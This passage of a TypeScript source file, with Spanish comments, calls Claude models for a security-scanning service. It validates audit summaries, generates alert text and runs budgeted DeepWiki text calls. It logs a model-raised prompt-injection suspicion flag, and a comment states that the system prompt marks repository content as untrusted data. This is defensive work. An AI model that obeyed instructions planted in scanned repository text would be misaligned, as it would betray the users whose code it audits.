             hallazgos: filas.map(({ id, ...x }) => ({ finding_id: id, ...x })) } });
  if (!r.ok) return r.reasons ? { ok: false, code: r.code, reasons: r.reasons } : { ok: false, code: r.code };
  // Se descartan finding_id inventados (y repetidos en top) y las relaciones que quedan con < 2 ids (11.10.3)
  const enviados = new Set(filas.map((f) => f.id));
  const top: AuditSummaryIA['top'] = [];
  for (const t of r.data.top) if (enviados.has(t.finding_id) && !top.some((x) => x.finding_id === t.finding_id)) top.push(t);
  const relaciones = r.data.relaciones
    .map((x) => ({ finding_ids: unicos(x.finding_ids.filter((id) => enviados.has(id))), explicacion: x.explicacion }))
    .filter((x) => x.finding_ids.length >= 2);
  if (top.length === 0) return { ok: false, code: 'invalid' };
  if (r.data.sospecha_inyeccion) log('warn', 'ia.injection_flag', { ruta: 'audit_summary', scan_run_id: p.scan_run_id ?? null });
  const v = AuditSummary.safeParse({ resumen: r.data.resumen, top, relaciones, model: r.model,
    ...(r.data.sospecha_inyeccion ? { suspected_injection: true } : {}) });
  return v.success ? { ok: true, summary: v.data, cost_usd: r.cost_usd } : { ok: false, code: 'invalid' };
}

export type HechosAlerta = { servicio: string; reglas: string[]; host: string | null; eventos: number | null;
  porcentaje: number | null; minutos: number | null; accion_propuesta: string | null };

/** IA-3 (P1). Solo hechos generados por nosotros (sin IP, UA, rutas ni severidad). Quien llama envuelve todo en
 *  Promise.race de 3.000 ms (cubre también las RPC del libro) y, si no llega, usa la plantilla de la sección 12. */
export async function pedirTextoAlerta(env: CloudflareBindings, p: { org_id: string; hechos: HechosAlerta;
  timeoutMs?: number }): Promise<ResultadoIA<AlertTextIA>> {
  return llamarIA(env, { org_id: p.org_id, ruta: 'alert_text', sistema: SISTEMA_ALERTA, esquema: AlertTextIA,
    datos: p.hechos, timeoutMs: p.timeoutMs });
}

// ── Rutas de texto de DeepWiki (packages/deepwiki/LEEME.md, punto 7; ruta de ai_usage en 0010) ──────────────────────
// Mismo orden que llamarIA: IA_CORTE → vg_ai_status → vg_ai_reserve → llamada → vg_ai_settle; nunca lanza. Sin NUCLEO ni
// esquema JSON: la salida es Markdown del motor, cuyo system ya marca el repo como dato no confiable (<repo_*>) y que
// redacta y sanea lo que devuelve (sin HTML, enlaces ni URLs; Mermaid con lista blanca). El modelo lo elige el motor
// (modeloPara con los de la corrida) y max_tokens es el suyo, acotado por el plan de la ruta.
export type RutaWiki = 'wiki_triage' | 'wiki_area' | 'wiki_sintesis';
type PlanTexto = { effort: 'low' | 'medium'; max_tokens: number; timeoutMs: number; retries: number };
// max_tokens = MAX_TOKENS_SALIDA del motor (4.000, 1.500 y 6.000): el techo con que el motor corta antes de pagar.
// Sin reintentos del SDK: los reintenta la cola (y el timeout queda por debajo de los 5 min de la marca de síntesis).
const PLAN_WIKI: Record<RutaWiki, PlanTexto> = {
  wiki_triage:   { effort: 'low', max_tokens: 4000, timeoutMs: 60_000, retries: 0 },
  wiki_area:     { effort: 'low', max_tokens: 1500, timeoutMs: 60_000, retries: 0 },
  wiki_sintesis: { effort: 'medium', max_tokens: 6000, timeoutMs: 120_000, retries: 0 },
};
// Escalera (11.3): la wiki es opcional y la síntesis va con Sonnet; en minimal no corre.
const WIKI_POR_NIVEL: Record<Nivel, boolean> = { normal: true, reduced: true, minimal: false };
const MODELOS_WIKI: ReadonlySet<string> = new Set<Modelo>(['claude-haiku-5-5', 'claude-sonnet-5-5', 'claude-opus-5-5']);

export type UsoTexto = { input_tokens: number; output_tokens: number; cache_read_input_tokens: number;
  cache_creation_input_tokens: number };
// stop_reason max_tokens o refusal vuelve con ok: el motor los convierte en avisos o en su documento de respaldo.
// reintentar: el ritmo por minuto o un 429 de rate limit se liberan solos (la cola reintenta en vez de fallar).
export type ResultadoTexto =
  | { ok: true; texto: string; model: string; uso: UsoTexto; stop_reason: string | null; cost_usd: number }
  | { ok: false; code: Fallo; reintentar?: boolean };

export async function llamarIATexto(env: CloudflareBindings, p: { org_id: string; ruta: RutaWiki; modelo: string;
  sistema: string; usuario: string; maxTokens: number; timeoutMs?: number }): Promise<ResultadoTexto> {
  if (env.IA_CORTE === '1') return { ok: false, code: 'disabled' };
  if (!env.ANTHROPIC_API_KEY) return { ok: false, code: 'disabled' };
  const plan = PLAN_WIKI[p.ruta];
  if (!plan || !MODELOS_WIKI.has(p.modelo)) return { ok: false, code: 'invalid' };
  const modelo = p.modelo as Modelo;
  const max_tokens = Math.min(plan.max_tokens, Math.max(1, Math.floor(p.maxTokens) || plan.max_tokens));
  const st = await estadoIA(env, p.org_id);
  if (!st || !st.enabled) return { ok: false, code: 'disabled' };
  if (st.level === 'off' || !WIKI_POR_NIVEL[st.level]) return { ok: false, code: 'budget' };
  if (st.calls_1m >= RITMO_POR_MINUTO) return { ok: false, code: 'budget', reintentar: true };

  // Peor caso con la misma cota que llamarIA (2 caracteres por token, sin count_tokens)
  const entrada = Math.ceil((p.sistema.length + p.usuario.length) / 2);
  if (modelo === 'claude-haiku-5-5' && entrada > TOPE_HAIKU_TOKENS) return { ok: false, code: 'invalid' };
  const peor = peorCasoUSD(modelo, entrada, max_tokens, false);
  if (peor > TOPE_PETICION_USD) return { ok: false, code: 'budget' };
  const rv = await reservarIA(env, p.org_id, p.ruta, modelo, peor);
  if (!rv?.ok || !rv.usage_id) {
    if (rv?.code === 'disabled') return { ok: false, code: 'disabled' };
    return rv?.scope === 'rate' ? { ok: false, code: 'budget', reintentar: true } : { ok: false, code: 'budget' };
  }
  const reserva = rv.usage_id;

  let msg: Anthropic.Message;
  try {
    const ai = (cliente ??= new Anthropic({ apiKey: env.ANTHROPIC_API_KEY, maxRetries: 0 }));
    // Sin temperature, top_p, top_k, tool_choice ni tools (11.2, 11.11). El system del motor es estable: punto de caché.
    const cuerpo = { model: modelo, max_tokens,
      system: [{ type: 'text', text: p.sistema, cache_control: { type: 'ephemeral' } }],
      messages: [{ role: 'user', content: p.usuario }], output_config: { effort: plan.effort } } as any;   // output_config: cast puntual
    msg = await ai.messages.create(cuerpo, { timeout: p.timeoutMs ?? plan.timeoutMs, maxRetries: plan.retries }) as Anthropic.Message;
  } catch (e) {
    const status = e instanceof Anthropic.APIError && typeof e.status === 'number' ? e.status : null;
    const es4xx = status !== null && status < 500;
    await liquidarIA(env, reserva, { cost: es4xx ? 0 : null, stop: es4xx ? 'error_4xx' : 'error_transient' });
    log('warn', 'ia.error', { ruta: p.ruta, model: modelo, usage_id: reserva, status,
      error_type: e instanceof Anthropic.APIError ? e.type : null, tipo: e instanceof Error ? e.name : 'desconocido' });
    const code = falloProveedor(e, status);
    const ritmo = status === 429 && !(e instanceof Error && SIN_SALDO.test(e.message));
    return ritmo ? { ok: false, code, reintentar: true } : { ok: false, code };
  }

  const u = msg.usage as UsoMensaje;
  const costo = costoMensajeUSD(msg.model, u);
  const refusal = msg.stop_reason === 'refusal' ? (msg.stop_details?.category ?? 'unknown') : null;
  await liquidarIA(env, reserva, { input: u.input_tokens, cache_read: u.cache_read_input_tokens,
    cache_write: u.cache_creation_input_tokens, output: u.output_tokens, cost: costo, stop: msg.stop_reason ?? 'unknown',
    refusal, request_id: msg.id });
  log('info', 'ia.llamada', { ruta: p.ruta, model: msg.model, usage_id: reserva, request_id: msg.id,
    stop_reason: msg.stop_reason, refusal, input_tokens: u.input_tokens ?? 0, output_tokens: u.output_tokens ?? 0,
    cache_read: u.cache_read_input_tokens ?? 0, cache_write: u.cache_creation_input_tokens ?? 0, cost_usd: costo });
  const texto = msg.content.flatMap((bl) => (bl.type === 'text' ? [bl.text] : [])).join('');   // sin bloques thinking
  return { ok: true, texto, model: msg.model, stop_reason: msg.stop_reason ?? null, cost_usd: costo,
    uso: { input_tokens: u.input_tokens ?? 0, output_tokens: u.output_tokens ?? 0,
      cache_read_input_tokens: u.cache_read_input_tokens ?? 0, cache_creation_input_tokens: u.cache_creation_input_tokens ?? 0 } };
}
